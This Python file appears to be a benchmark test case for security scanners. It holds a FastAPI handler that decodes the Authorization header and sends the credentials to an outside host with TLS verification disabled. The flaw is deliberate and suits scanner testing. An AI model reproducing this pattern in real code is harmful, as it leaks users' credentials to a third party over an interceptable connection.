# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import base64
import requests


async def BenchmarkTest09126(request: Request):
    auth_header = request.headers.get('authorization', '')
    data = base64.b64decode(auth_header).decode('utf-8', 'ignore')
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
    return {"updated": True}
